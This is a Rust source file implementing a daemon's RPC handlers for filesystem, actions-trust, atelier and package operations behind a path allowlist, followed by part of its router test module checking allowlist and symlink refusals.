//! `/api/rpc` bodies for WP-19 slice 5a: the rest of the fs family that can
//! be served honestly (`fs_kind`, `fs_mime`, `fs_search`, `fs_rename`, and
//! since the 2026-10-06 gap audit `fs_exists`) and
//! the actions / keybindings file layer with its project-trust record
//! (`actions_read_files`, `actions_write`, `keybindings_write`,
//! `actions_trust_status`, `actions_trust_grant`, `actions_trust_revoke`) —
//! and, from slice 6, the per-project Atelier skill files
//! (`atelier_file_read` / `atelier_file_write`) and `action_git_branch`.
//!
//! Same house pattern as `rpc_local` / `rpc_shell`: the arm *names* stay in
//! `rpc.rs`'s dispatch `match` (the parity ratchet reads them there) and
//! delegate here; every body calls the core the desktop `#[tauri::command]`
//! calls (`server::shared::{fs, actions}`) and returns the same serialized
//! type, so the JSON shapes are the desktop's by construction. Arguments are
//! decoded by `rpc_shell::targ` (camelCase as `tauri-cmd.ts` sends them, or
//! snake_case; `null` = absent for an `Option`).
//!
//! **Paths.** Every caller path goes through the daemon's `PathGuard`, which
//! resolves it exactly as the desktop's `resolve_allowlisted` does and checks
//! the canonical result against the fs allowlist (`<data-dir>/fs_roots.json`)
//! — the boundary the served `fs_read` / `fs_write` use — and then refuses the
//! daemon's own state (`--data-dir`, the discovery file) even when the
//! allowlist covers it (`server::reserved`). The actions arms take
//! no path: they read and write `<home>/.ikenga/{actions,keybindings}.json`
//! (the daemon PROCESS's home — the same single-user seam as the personal
//! `settings.json`, G-PRINCIPAL topology B) and `<root>/.ikenga/…` for the
//! resolved project, whose root must be inside the allowlist (the manager's
//! `RootGuard`). The shared scope layer refuses a symlinked file or
//! `.ikenga/` directory on both surfaces.
//!
//! **No events.** The desktop manager emits `actions://changed` from its
//! watcher and on a trust grant / revoke. The daemon's manager has no
//! notifier (there is no event channel — the web transport's `listen()` is a
//! no-op), so it starts no watcher and emits nothing; the browser re-reads.
//!
//! **Trust.** A remote write cannot bypass the trust gate: `actions_write` /
//! `keybindings_write` never touch the trust record (see
//! `server::shared::actions`), which lives in `<data-dir>/actions-trust.json`,
//! user-side, never under the project. A written project file is untrusted /
//! held until `actions_trust_grant` pins the hash of the document in force,
//! and a grant with a stale hash is refused whole — the same gate the desktop
//! Trust dialog goes through. The daemon executes no action (`action_exec`
//! stays allowlisted), so trust here only decides what the browser shows.

use std::path::{Path, PathBuf};
use std::sync::Arc;

use serde_json::Value;

use super::rpc::RpcResponse;
use super::rpc_local::{data_dir, respond, respond_named};
use super::rpc_shell::{targ, PathGuard};
use super::shared::actions::schema::FileKind;
use super::shared::actions::{
    ActionsManager, ActionsWriteResult, RootGuard, TrustGrantRequest, TrustRevokeRequest,
};
use super::shared::fs as shared_fs;
use super::shared::settings::SettingsScope;
use super::shared::{atelier, git};
use super::AppState;

const NO_DATA_DIR_ACTIONS: &str =
    "no actions store: the daemon was started without --data-dir, so there is no ikenga.db (projects) or actions-trust.json to open";
const NO_HOME_ACTIONS: &str =
    "no actions store: the daemon has no HOME in its environment, so there is no ~/.ikenga/actions.json to resolve";

// ─── fs ──────────────────────────────────────────────────────────────────────

/// `state.path_guard` as the shared cores' resolver.
fn resolver(state: &AppState) -> impl Fn(&str) -> Result<PathBuf, String> + Sync + '_ {
    move |p: &str| state.path_guard.resolve(p)
}

/// The desktop answers `"missing"` for an allowlist-rejected path, and so
/// does this — but only once the allowlist exists: without `--data-dir`
/// every path would read as missing, which is an answer, not the truth.
/// `fs_read`: the desktop's `{ bytes, mime }`, which is what every viewer reads.
pub(super) async fn fs_read(state: &AppState, args: &Value) -> RpcResponse {
    let r = async {
        let path: String = targ(args, &["path"])?;
        state.path_guard.ready()?;
        shared_fs::read(&resolver(state), &path).await
    }
    .await;
    respond("fs_read", r)
}

/// `fs_write`. The desktop command is `fs_write(path, bytes)`, so `bytes` (an array of numbers)
/// is what `tauri-cmd.ts` sends. `content` (a string) is what the daemon's original arm took and
/// is kept. **Neither is an error.** The original arm read `content` with
/// `unwrap_or_default()`, so a call that sent only `bytes` wrote an empty file over the target.
pub(super) async fn fs_write(state: &AppState, args: &Value) -> RpcResponse {
    let r = async {
        let path: String = targ(args, &["path"])?;
        let bytes: Option<Vec<u8>> = targ(args, &["bytes"])?;
        let content: Option<String> = targ(args, &["content"])?;
        let data = match (bytes, content) {
            (Some(b), None) => b,
            (None, Some(c)) => c.into_bytes(),
            (Some(_), Some(_)) => {
                return Err("fs_write: pass `bytes` or `content`, not both".to_string())
            }
            (None, None) => return Err("fs_write: `bytes` is required".to_string()),
        };
        state.path_guard.ready()?;
        // The deep resolver, not `resolver(state)`: a write may target a file in a folder that
        // does not exist yet, so the allowlist check walks up to the nearest existing ancestor,
        // and it carries the `..` and dangling-link refusals `reserved.rs` pins.
        shared_fs::write(&|p: &str| state.path_guard.resolve_deep(p), &path, &data).await
    }
    .await;
    respond("fs_write", r)
}

/// `fs_list`. The desktop command is `fs_list(dir, glob)`, so `dir` is the argument
/// `tauri-cmd.ts` sends; `path` is kept because the file picker and older callers use it. A
/// missing directory is an error: the original arm defaulted to `"."`, which on a daemon is
/// its own working directory and listed nothing the caller asked for.
pub(super) async fn fs_list(state: &AppState, args: &Value) -> RpcResponse {
    let r = async {
        let dir: String = targ(args, &["dir", "path"])?;
        let glob: Option<String> = targ(args, &["glob"])?;
        if glob.is_some() {
            return Err("fs_list: `glob` is not served by the headless daemon yet".to_string());
        }
        state.path_guard.ready()?;
        shared_fs::list(&resolver(state), &dir).await
    }
    .await;
    respond("fs_list", r)
}

pub(super) async fn fs_kind(state: &AppState, args: &Value) -> RpcResponse {
    let r = async {
        let path: String = targ(args, &["path"])?;
        state.path_guard.ready()?;
        Ok(shared_fs::kind(&resolver(state), &path).await)
    }
    .await;
    respond("fs_kind", r)
}

/// The desktop's `fs_exists`: `true` for an allowlisted regular file, and
/// `false` — not an error — for a refused path, exactly as the desktop
/// command folds `resolve_allowlisted` failures (gap audit 2026-10-06 rank
/// 17: the rejection surfaced as an unhandled promise rejection in the
/// markdown path linkifier). Refused is `false` whether or not the path
/// exists, so it answers nothing about the world outside the allowlist.
/// Only a daemon with no allowlist at all errors, naming the flag, as
/// `fs_kind` does.
pub(super) async fn fs_exists(state: &AppState, args: &Value) -> RpcResponse {
    let r = async {
        let path: String = targ(args, &["path"])?;
        state.path_guard.ready()?;
        Ok(shared_fs::exists(&resolver(state), &path).await)
    }
    .await;
    respond("fs_exists", r)
}

pub(super) fn fs_mime(state: &AppState, args: &Value) -> RpcResponse {
    let r = (|| {
        let path: String = targ(args, &["path"])?;
        state.path_guard.ready()?;
        shared_fs::mime(&resolver(state), &path)
    })();
    respond("fs_mime", r)
}

/// The root must be inside the allowlist (and not the daemon's own state);
/// the walk never follows a symlinked directory out of it (see
/// `shared::fs::search`) and never matches or descends into the data dir or
/// the discovery file, even when the root is an ancestor of them. Same caps
/// as the desktop: `limit` (default 500, minimum 1), early stop with
/// `truncated`.
pub(super) async fn fs_search(state: &AppState, args: &Value) -> RpcResponse {
    let r = async {
        let root: String = targ(args, &["root"])?;
        let query: String = targ(args, &["query"])?;
        let show_hidden: bool = targ(args, &["showHidden", "show_hidden"])?;
        let show_ignored: bool = targ(args, &["showIgnored", "show_ignored"])?;
        let limit: Option<usize> = targ(args, &["limit"])?;
        state.path_guard.ready()?;
        // Resolved once per walk; every entry is then canonical (the root is,
        // and the walk follows no symlink), so the per-entry check is a prefix
        // compare plus, for a directory, its inode.
        let reserved = state.path_guard.reserved_snapshot();
        shared_fs::search_skipping(
            &resolver(state),
            &root,
            &query,
            show_hidden,
            show_ignored,
            limit,
            move |entry| {
                let dir_meta = entry
                    .file_type()
                    .is_ok_and(|t| t.is_dir())
                    .then(|| entry.metadata().ok())
                    .flatten();
                reserved.skips_entry(&entry.path(), dir_meta.as_ref())
            },
        )
        .await
    }
    .await;
    respond("fs_search", r)
}

/// Every end is resolved through the allowlist; `toName` is a bare basename
/// and the optional `toDir` makes it a move into that folder.
pub(super) async fn fs_rename(state: &AppState, args: &Value) -> RpcResponse {
    let r = async {
        let from: String = targ(args, &["from"])?;
        let to_name: String = targ(args, &["toName", "to_name"])?;
        let to_dir: Option<String> = targ(args, &["toDir", "to_dir"])?;
        state.path_guard.ready()?;
        shared_fs::rename(&resolver(state), &from, &to_name, to_dir.as_deref()).await
    }
    .await;
    respond("fs_rename", r)
}

// ─── actions / keybindings ───────────────────────────────────────────────────

/// The daemon's `ActionsManager`: the desktop's, with no notifier (no
/// watcher, no emits), the trust record in `<data-dir>`, the personal files
/// under `home`, and every project root checked against `guard`.
pub(crate) fn daemon_actions(
    db: Arc<crate::db::PaDb>,
    data_dir: &Path,
    home: PathBuf,
    guard: PathGuard,
) -> ActionsManager {
    let root_guard: RootGuard = Arc::new(move |root: &Path| {
        guard.check_maybe_missing(root).map_err(|e| {
            format!(
                "the project root is outside the daemon's fs allowlist: {} ({e})",
                root.display()
            )
        })
    });
    ActionsManager::with_notifier(None, db, data_dir, home).with_root_guard(root_guard)
}

fn actions(state: &AppState) -> Result<&ActionsManager, String> {
    match &state.actions {
        Some(m) => Ok(m),
        None if state.config.data_dir.is_none() || state.pa_db.is_none() => {
            Err(NO_DATA_DIR_ACTIONS.to_string())
        }
        None => Err(NO_HOME_ACTIONS.to_string()),
    }
}

pub(super) async fn actions_read_files(state: &AppState, args: &Value) -> RpcResponse {
    let r = async {
        let project_id: Option<String> = targ(args, &["projectId", "project_id"])?;
        actions(state)?.read_files(project_id.as_deref()).await
    }
    .await;
    respond("actions_read_files", r)
}

async fn write(
    state: &AppState,
    kind: FileKind,
    args: &Value,
) -> Result<ActionsWriteResult, String> {
    let scope: String = targ(args, &["scope"])?;
    // Tauri's `document: Value` takes JSON null as a value (which validation
    // then refuses), so read it raw rather than through `targ`.
    let document = args
        .get("document")
        .cloned()
        .ok_or_else(|| "`document` is required".to_string())?;
    let project_id: Option<String> = targ(args, &["projectId", "project_id"])?;
    let manager = actions(state)?;
    let scope = SettingsScope::parse(&scope)?;
    manager
        .write(kind, scope, project_id.as_deref(), document)
        .await
}

pub(super) async fn actions_write(state: &AppState, args: &Value) -> RpcResponse {
    respond("actions_write", write(state, FileKind::Actions, args).await)
}

/// A project `scope: "os"` rule is refused with `E_OS_LAYER` (DEC-60), by the
/// same validation the desktop runs.
pub(super) async fn keybindings_write(state: &AppState, args: &Value) -> RpcResponse {
    respond(
        "keybindings_write",
        write(state, FileKind::Keybindings, args).await,
    )
}

pub(super) async fn actions_trust_status(state: &AppState, args: &Value) -> RpcResponse {
    let r = async {
        let project_id: Option<String> = targ(args, &["projectId", "project_id"])?;
        actions(state)?.trust_status(project_id.as_deref()).await
    }
    .await;
    respond("actions_trust_status", r)
}

/// `request` is the desktop's `TrustGrantRequest` (camelCase fields — Tauri
/// renames only top-level parameter names). Refused whole if any hash is not
/// the one in force now.
pub(super) async fn actions_trust_grant(state: &AppState, args: &Value) -> RpcResponse {
    let r = async {
        let request: TrustGrantRequest = targ(args, &["request"])?;
        let project_id: Option<String> = targ(args, &["projectId", "project_id"])?;
        actions(state)?
            .trust_grant(project_id.as_deref(), request)
            .await
    }
    .await;
    respond("actions_trust_grant", r)
}

/// An absent / empty `request` revokes everything the project has.
pub(super) async fn actions_trust_revoke(state: &AppState, args: &Value) -> RpcResponse {
    let r = async {
        let request: Option<TrustRevokeRequest> = targ(args, &["request"])?;
        let project_id: Option<String> = targ(args, &["projectId", "project_id"])?;
        actions(state)?
            .trust_revoke(project_id.as_deref(), request.unwrap_or_default())
            .await
    }
    .await;
    respond("actions_trust_revoke", r)
}

// ─── atelier files + `{{branch}}` (WP-19 slice 6) ────────────────────────────
//
// Bodies in `server::shared::{atelier, git}`, the cores the desktop commands
// call. The caller's root (`projectRoot`, `root`) goes through the daemon's
// `PathGuard` — the fs allowlist plus the daemon's own state — before anything
// under it is touched, and the atelier helpers then stay inside the CANONICAL
// root (`atelier::Reach::Confined`: a symlink at `.atelier`, `.atelier/<skill>`
// or the file is refused, the temp file is created exclusively). `skill` /
// `file` keep the desktop's `is_safe_segment`. Nothing spawns; nothing is
// emitted. Without `--data-dir` there is no allowlist: `NO_DB`.

/// The allowlist exists (it is loaded from `--data-dir`).
fn fs_boundary(state: &AppState) -> Result<(), String> {
    data_dir(state, super::rpc::NO_DB)?;
    state.path_guard.ready()
}

/// A root outside the allowlist is an error, never the desktop's `null`
/// (which would read as "no such file"); an unsafe segment, an absent root or
/// file is `null`, as on the desktop.
pub(super) fn atelier_file_read(state: &AppState, args: &Value) -> RpcResponse {
    let r = (|| {
        let project_root: Option<String> = targ(args, &["projectRoot", "project_root"])?;
        let skill: String = targ(args, &["skill"])?;
        let file: String = targ(args, &["file"])?;
        fs_boundary(state)?;
        let guard = &state.path_guard;
        let check = |p: &Path| guard.check_maybe_missing(p);
        atelier::read(
            project_root.as_deref(),
            &skill,
            &file,
            atelier::Reach::Confined(&check),
        )
    })();
    respond_named("atelier_file_read", r)
}

/// The desktop's atomic write and its error strings, confined to the root.
/// The root must already exist (the desktop would create it).
pub(super) fn atelier_file_write(state: &AppState, args: &Value) -> RpcResponse {
    let r = (|| {
        let project_root: Option<String> = targ(args, &["projectRoot", "project_root"])?;
        let skill: String = targ(args, &["skill"])?;
        let file: String = targ(args, &["file"])?;
        let content: String = targ(args, &["content"])?;
        fs_boundary(state)?;
        let guard = &state.path_guard;
        let check = |p: &Path| guard.check_maybe_missing(p);
        atelier::write(
            project_root.as_deref(),
            &skill,
            &file,
            &content,
            atelier::Reach::Confined(&check),
        )
    })();
    respond_named("atelier_file_write", r)
}

/// `{{branch}}` at `root`. A relative root is the desktop's `null`; a root the
/// guard refuses is an error. `.git` and the `HEAD` it resolves to (a
/// worktree's `gitdir:` target included) are read only when their canonical
/// path is admitted too — otherwise `null`, no branch.
pub(super) async fn action_git_branch(state: &AppState, args: &Value) -> RpcResponse {
    let r = async {
        let root: String = targ(args, &["root"])?;
        fs_boundary(state)?;
        let root = PathBuf::from(root);
        if !root.is_absolute() {
            return Ok(None);
        }
        state.path_guard.check_maybe_missing(&root)?;
        let guard = state.path_guard.clone();
        let may_read = move |p: &Path| p.canonicalize().is_ok_and(|c| guard.check(&c).is_ok());
        Ok(
            tokio::task::spawn_blocking(move || git::git_branch_at_with(&root, &may_read))
                .await
                .unwrap_or(None),
        )
    }
    .await;
    respond("action_git_branch", r)
}

// ─── pkg manifests + scaffold (WP-19 slice 8) ────────────────────────────────
//
// None of these needs the live pkg kernel: a preview parses one manifest, the
// workspace scan reads a directory (its `installed` flag comes from the
// daemon's own `--pkgs-dir` index — the set `pkg_kernel_status` reports), and
// the scaffold writes embedded templates. Every caller path goes through the
// guard; the scaffold writes through `confined_fs`.

/// `pkg_preview_manifest`: `installPath` must resolve (canonically) inside the
/// fs allowlist and outside the daemon's state, and so must the
/// `manifest.json` it reads — a link there to anywhere the guard refuses is
/// refused, not followed. Registers nothing. Errors otherwise are the
/// desktop's (`read …/manifest.json: …`, `parse manifest at …`).
///
/// A pkg under `--pkgs-dir` previews only when that dir is inside the fs
/// allowlist: the index names it, but the guard is the boundary for a path a
/// caller hands back.
pub(super) fn pkg_preview_manifest(state: &AppState, args: &Value) -> RpcResponse {
    use super::shared::pkg_workspace;
    use std::path::Path;
    let r = (|| {
        let install_path: String = targ(args, &["installPath", "install_path"])?;
        if install_path.is_empty() {
            return Err("`installPath` is required".to_string());
        }
        let target_path = Path::new(&install_path);
        if let Some(installed) = state
            .pkg_index
            .installed()
            .iter()
            .find(|s| Path::new(&s.install_path) == target_path)
        {
            return pkg_workspace::preview_manifest(Path::new(&installed.install_path));
        }
        fs_boundary(state)?;
        let dir = state.path_guard.resolve(&install_path)?;
        if let Ok(manifest) = dir.join("manifest.json").canonicalize() {
            state.path_guard.check(&manifest)?;
        }
        // A missing (or dangling) manifest.json reads nothing: `Package::load`
        // reports the desktop's own "read …" error for it.
        pkg_workspace::preview_manifest(&dir)
    })();
    respond("pkg_preview_manifest", r)
}

/// `pkg_discover_workspace`: `workspaceDir`, else the daemon process's
/// `IKENGA_WORKSPACE_DIR` (the desktop's own fallback, for the daemon's own
/// env); neither = `[]`, as on the desktop. The dir is resolved through the
/// guard (a refusal is an error, never an empty list); a missing dir inside
/// the allowlist is `[]`. A child dir or `manifest.json` that canonicalizes
/// somewhere the guard refuses reads as absent.
pub(super) fn pkg_discover_workspace(state: &AppState, args: &Value) -> RpcResponse {
    use super::shared::pkg_workspace::{self, Reach};
    let r = (|| {
        let workspace_dir: Option<String> = targ(args, &["workspaceDir", "workspace_dir"])?;
        let Some(dir) = workspace_dir.or_else(|| std::env::var("IKENGA_WORKSPACE_DIR").ok()) else {
            return Ok(Vec::new());
        };
        if dir.is_empty() {
            // The desktop's `PathBuf::from("")` is no directory: nothing read.
            return Ok(Vec::new());
        }
        fs_boundary(state)?;
        let dir = state.path_guard.resolve_deep(&dir)?;
        let installed: std::collections::HashSet<String> = state
            .pkg_index
            .installed()
            .iter()
            .map(|s| s.id.clone())
            .collect();
        let guard = &state.path_guard;
        let check = |p: &Path| guard.check(p);
        Ok(pkg_workspace::discover(
            &dir,
            &installed,
            Reach::Confined(&check),
        ))
    })();
    respond("pkg_discover_workspace", r)
}

/// `pkg_scaffold`: the desktop's destination rules against the router home
/// (G-PRINCIPAL single-user seam) and the daemon's `ikenga.db` projects. The
/// destination must be absolute — the desktop's `project` fallback for the
/// workspace scope is the process cwd (`.`), which the daemon refuses rather
/// than scaffold into its own working directory — and must pass the guard
/// (fs allowlist + the daemon's state) as resolved from its canonical nearest
/// existing ancestor; the write then runs from that form with
/// `confined_fs::Reach::Confined`. `targetPath` / `targetFolder` in the answer
/// are that canonical form. `params` is decoded as the desktop's
/// `PkgScaffoldParams` (camelCase fields — Tauri renames only top-level
/// argument names).
pub(super) async fn pkg_scaffold(state: &AppState, args: &Value) -> RpcResponse {
    use super::shared::pkg_scaffold::{self as scaffold, PkgScaffoldParams, Reach};
    let r = async {
        let params: PkgScaffoldParams = targ(args, &["params"])?;
        fs_boundary(state)?;
        let db = super::rpc_local::pa_db(state)?;
        let (folder, primary) =
            scaffold::resolve_destination_in(db, &params, state.home.as_deref()).await?;
        if !folder.is_absolute() {
            return Err(format!(
                "scaffold destination is not absolute: {} (the daemon will not scaffold into its working directory)",
                folder.display()
            ));
        }
        let canonical = state.path_guard.resolve_maybe_missing(&folder)?;
        let primary = canonical.join(
            primary
                .strip_prefix(&folder)
                .map_err(|_| format!("failed to resolve {}", primary.display()))?,
        );
        let guard = &state.path_guard;
        let check = |p: &Path| guard.check_maybe_missing(p);
        let files =
            scaffold::execute_scaffold_in(&params, &canonical, &primary, Reach::Confined(&check))?;
        Ok(scaffold::result(params, &canonical, &primary, files))
    }
    .await;
    respond("pkg_scaffold", r)
}

/// Router tests for every slice-8 arm (these three, and `rpc_shell`'s
/// `pin_screenshot_write` / `scaffold_agent_config`), a file of their own.
#[cfg(test)]
#[path = "rpc_slice8_tests.rs"]
mod slice8_tests;

#[cfg(test)]
mod tests {
    //! House pattern (see `rpc_shell`'s tests): a literal `ServerConfig` →
    //! the router → `oneshot` POST `/api/rpc` with the bearer token. The home
    //! and the fs allowlist are pinned to temp dirs, so nothing here touches
    //! the real `~/.ikenga` or installs the process-global `fs_roots`.

    use std::path::{Path, PathBuf};
    use std::sync::Arc;

    use axum::body::Body;
    use axum::http::StatusCode;
    use axum::Router;
    use serde_json::{json, Value};
    use tower::ServiceExt;

    use super::PathGuard;
    use crate::db::PaDb;
    use crate::engines::EngineRegistry;
    use crate::executor::ExecutorTier;
    use crate::pty::PtyManager;
    use crate::server::shared::actions::trust::{run_hash, TRUST_FILE_NAME};
    use crate::server::shared::actions::ActionsManager;
    use crate::server::shared::fs as shared_fs;
    use crate::server::shared::projects::{self, CreateArgs};
    use crate::server::{router_with, ServerConfig};

    fn config(data_dir: Option<PathBuf>) -> ServerConfig {
        ServerConfig {
            host: "127.0.0.1".into(),
            port: 0,
            static_dir: PathBuf::from("no-spa-here"),
            pkgs_dir: None,
            data_dir,
            auth_token: Some("tok".into()),
            allowed_origins: vec![],
            idle_timeout_secs: None,
            executor_tier: ExecutorTier::T0,
        }
    }

    /// A daemon with `--data-dir`, a home, and an fs allowlist of exactly
    /// `allowed/`. `outside/` is a sibling the allowlist does not cover.
    struct Daemon {
        _tmp: tempfile::TempDir,
        data: PathBuf,
        home: PathBuf,
        allowed: PathBuf,
        outside: PathBuf,
        db: Arc<PaDb>,
        guard: PathGuard,
        router: Router,
    }

    fn daemon_with_home(with_home: bool) -> Daemon {
        let tmp = tempfile::tempdir().unwrap();
        let root = tmp.path().canonicalize().unwrap();
        let (data, home) = (root.join("data"), root.join("home"));
        let (allowed, outside) = (root.join("allowed"), root.join("outside"));
        for d in [&data, &home, &allowed, &outside] {
            std::fs::create_dir_all(d).unwrap();
        }
        let roots_file = root.join("fs_roots.json");
        std::fs::write(
            &roots_file,
            json!({ "roots": [allowed.to_string_lossy()] }).to_string(),
        )
        .unwrap();
        let roots = crate::fs_roots::FsRoots::load(roots_file).unwrap();
        let guard = PathGuard::roots(Arc::new(roots));
        let db = Arc::new(PaDb::new(data.join("ikenga.db")));
        let router = router_with(
            config(Some(data.clone())),
            Arc::new(PtyManager::new()),
            Arc::new(EngineRegistry::new()),
            Some(db.clone()),
            None,
            with_home.then(|| home.clone()),
            guard.clone(),
        );
        Daemon {
            _tmp: tmp,
            data,
            home,
            allowed,
            outside,
            db,
            guard,
            router,
        }
    }

    fn daemon() -> Daemon {
        daemon_with_home(true)
    }

    /// No `--data-dir` (so no `PaDb`, no allowlist, no actions store).
    fn bare() -> Router {
        router_with(
            config(None),
            Arc::new(PtyManager::new()),
            Arc::new(EngineRegistry::new()),
            None,
            None,
            None,
            PathGuard::allowlist(),
        )
    }

    async fn rpc(router: &Router, cmd: &str, args: Value) -> Value {
        let res = router
            .clone()
            .oneshot(
                axum::http::Request::builder()
                    .method("POST")
                    .uri("/api/rpc")
                    .header("authorization", "Bearer tok")
                    .header("content-type", "application/json")
                    .body(Body::from(json!({ "cmd": cmd, "args": args }).to_string()))
                    .unwrap(),
            )
            .await
            .unwrap();
        assert_eq!(res.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(res.into_body(), usize::MAX)
            .await
            .unwrap();
        serde_json::from_slice(&bytes).unwrap()
    }

    async fn ok(router: &Router, cmd: &str, args: Value) -> Value {
        let res = rpc(router, cmd, args.clone()).await;
        assert_eq!(res["ok"], true, "{cmd} {args} → {res}");
        res.get("data").cloned().unwrap_or(Value::Null)
    }

    async fn err(router: &Router, cmd: &str, args: Value) -> String {
        let res = rpc(router, cmd, args.clone()).await;
        assert_eq!(res["ok"], false, "{cmd} {args} should fail → {res}");
        res["error"].as_str().unwrap().to_string()
    }

    fn s(p: &Path) -> String {
        p.to_string_lossy().into_owned()
    }

    #[cfg(unix)]
    fn symlink(target: &Path, link: &Path) {
        std::os::unix::fs::symlink(target, link).unwrap();
    }

    // ── no data dir / no home ───────────────────────────────────────────────

    #[tokio::test]
    async fn every_arm_without_data_dir_names_the_flag() {
        let r = bare();
        for (cmd, args) in [
            ("fs_kind", json!({ "path": "/tmp" })),
            ("fs_exists", json!({ "path": "/tmp/a.md" })),
            ("fs_mime", json!({ "path": "/tmp/a.md" })),
            (
                "fs_search",
                json!({ "root": "/tmp", "query": "a", "showHidden": false, "showIgnored": false }),
            ),
            ("fs_rename", json!({ "from": "/tmp/a", "toName": "b" })),
            ("actions_read_files", json!({})),
            (
                "actions_write",
                json!({ "scope": "personal", "document": { "version": 1 } }),
            ),
            (
                "keybindings_write",
                json!({ "scope": "personal", "document": { "version": 1 } }),
            ),
            ("actions_trust_status", json!({})),
            ("actions_trust_grant", json!({ "request": {} })),
            ("actions_trust_revoke", json!({})),
        ] {
            let e = err(&r, cmd, args).await;
            assert!(e.contains("--data-dir"), "{cmd}: {e}");
            assert!(e.starts_with(&format!("{cmd}: ")), "{cmd}: {e}");
        }
    }

    #[tokio::test]
    async fn actions_arms_without_a_home_say_so() {
        let d = daemon_with_home(false);
        for cmd in ["actions_read_files", "actions_trust_status"] {
            let e = err(&d.router, cmd, json!({})).await;
            assert!(e.contains("no HOME"), "{cmd}: {e}");
        }
        // The fs arms need no home.
        assert_eq!(
            ok(&d.router, "fs_kind", json!({ "path": s(&d.allowed) })).await,
            "dir"
        );
    }

    // ── fs_list ───────────────────────────────────────────────────

    fn names(v: &Value) -> Vec<String> {
        let mut n: Vec<String> = v
            .as_array()
            .unwrap()
            .iter()
            .map(|e| e["name"].as_str().unwrap().to_string())
            .collect();
        n.sort();
        n
    }

    #[tokio::test]
    async fn fs_list_answers_the_desktop_shape_for_dir_and_for_path() {
        let d = daemon();
        let r = &d.router;
        std::fs::write(d.allowed.join("a.txt"), b"abc").unwrap();
        std::fs::create_dir(d.allowed.join("sub")).unwrap();

        // `dir` is what the desktop command and tauri-cmd.ts use; `path` is what the file
        // picker sent. Both must list the same folder.
        let by_dir = ok(r, "fs_list", json!({ "dir": s(&d.allowed), "glob": null })).await;
        let by_path = ok(r, "fs_list", json!({ "path": s(&d.allowed) })).await;
        assert_eq!(names(&by_dir), ["a.txt", "sub"]);
        assert_eq!(names(&by_dir), names(&by_path));

        let entry = |v: &Value, name: &str| {
            v.as_array()
                .unwrap()
                .iter()
                .find(|e| e["name"] == name)
                .unwrap()
                .clone()
        };
        let file = entry(&by_dir, "a.txt");
        assert_eq!(file["isDir"], false);
        assert_eq!(file["size"], 3);
        assert!(file["modifiedMs"].as_i64().unwrap() > 0);
        assert_eq!(file["path"], s(&d.allowed.join("a.txt")));
        let dir = entry(&by_dir, "sub");
        assert_eq!(dir["isDir"], true);
        // The daemon's original spelling stays, for the file picker.
        assert_eq!(dir["is_dir"], true);
        assert_eq!(file["is_dir"], false);
    }

    #[tokio::test]
    async fn fs_list_never_defaults_to_the_daemons_working_directory() {
        let d = daemon();
        let e = err(&d.router, "fs_list", json!({})).await;
        assert!(e.contains("`dir` is required"), "{e}");
        let e = err(&d.router, "fs_list", json!({ "dir": null })).await;
        assert!(e.contains("`dir` is required"), "{e}");
    }

    #[tokio::test]
    async fn fs_list_refuses_outside_the_allowlist_and_unserved_glob() {
        let d = daemon();
        let r = &d.router;
        std::fs::write(d.outside.join("secret.txt"), b"s").unwrap();
        for dir in [
            s(&d.outside),
            format!("{}/../outside", s(&d.allowed)),
            ".".to_string(),
        ] {
            let e = err(r, "fs_list", json!({ "dir": dir })).await;
            assert!(e.contains("outside allowlist"), "{dir}: {e}");
        }
        // A glob would be silently ignored by a plain read_dir and return everything, so it
        // is refused until it is implemented.
        let e = err(r, "fs_list", json!({ "dir": s(&d.allowed), "glob": "*.rs" })).await;
        assert!(e.contains("glob"), "{e}");
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn fs_list_describes_a_link_out_of_the_allowlist_as_itself() {
        let d = daemon();
        let r = &d.router;
        std::fs::write(d.allowed.join("real.txt"), b"r").unwrap();
        // 40 bytes, so the secret's size and the link's own size cannot be confused.
        std::fs::write(d.outside.join("secret.txt"), vec![b's'; 40]).unwrap();
        std::fs::create_dir(d.outside.join("secret-dir")).unwrap();
        symlink(&d.allowed.join("real.txt"), &d.allowed.join("inside-link"));
        symlink(&d.outside.join("secret-dir"), &d.allowed.join("escape-dir"));
        symlink(&d.outside.join("secret.txt"), &d.allowed.join("escape-file"));
        symlink(&d.allowed.join("gone"), &d.allowed.join("dangling"));

        let listed = ok(r, "fs_list", json!({ "dir": s(&d.allowed) })).await;
        let get = |name: &str| {
            listed
                .as_array()
                .unwrap()
                .iter()
                .find(|e| e["name"] == name)
                .unwrap_or_else(|| panic!("{name} missing from {listed}"))
                .clone()
        };
        // Inside the allowlist: followed, so it reads like the file it points at.
        assert_eq!(get("inside-link")["size"], 1);
        assert_eq!(get("inside-link")["isDir"], false);
        // Outside: the link itself. Not a directory, and not the target's 40 bytes.
        assert_eq!(get("escape-dir")["isDir"], false);
        assert_ne!(get("escape-file")["size"], 40);
        assert_eq!(get("escape-file")["isDir"], false);
        // A dangling link is still listed, as a link.
        assert_eq!(get("dangling")["isDir"], false);
    }

    #[tokio::test]
    async fn fs_list_shows_a_folder_that_is_not_a_link_as_a_folder() {
        let d = daemon();
        std::fs::create_dir(d.allowed.join("plain")).unwrap();
        let listed = ok(&d.router, "fs_list", json!({ "dir": s(&d.allowed) })).await;
        assert_eq!(listed[0]["isDir"], true);
        assert_eq!(listed[0]["name"], "plain");
    }

    // ── fs_read / fs_write ────────────────────────────────────────

    #[tokio::test]
    async fn fs_read_answers_bytes_and_mime_like_the_desktop() {
        let d = daemon();
        let r = &d.router;
        std::fs::write(d.allowed.join("a.txt"), b"hi").unwrap();
        // Not UTF-8: the original string-returning arm failed on this.
        std::fs::write(d.allowed.join("blob.bin"), [0u8, 255, 1, 128]).unwrap();

        let text = ok(r, "fs_read", json!({ "path": s(&d.allowed.join("a.txt")) })).await;
        assert_eq!(text["bytes"], json!([104, 105]));
        assert_eq!(text["mime"], "text/plain");
        let bin = ok(r, "fs_read", json!({ "path": s(&d.allowed.join("blob.bin")) })).await;
        assert_eq!(bin["bytes"], json!([0, 255, 1, 128]));
        assert_eq!(bin["mime"], "application/octet-stream");

        std::fs::write(d.outside.join("x.txt"), b"x").unwrap();
        let e = err(r, "fs_read", json!({ "path": s(&d.outside.join("x.txt")) })).await;
        assert!(e.contains("outside allowlist"), "{e}");
    }

    #[tokio::test]
    async fn fs_write_takes_bytes_like_the_desktop_and_round_trips() {
        let d = daemon();
        let r = &d.router;
        let deep = s(&d.allowed.join("deep/er/f.bin"));
        ok(r, "fs_write", json!({ "path": deep, "bytes": [0, 255, 1] })).await;
        assert_eq!(std::fs::read(d.allowed.join("deep/er/f.bin")).unwrap(), [0, 255, 1]);
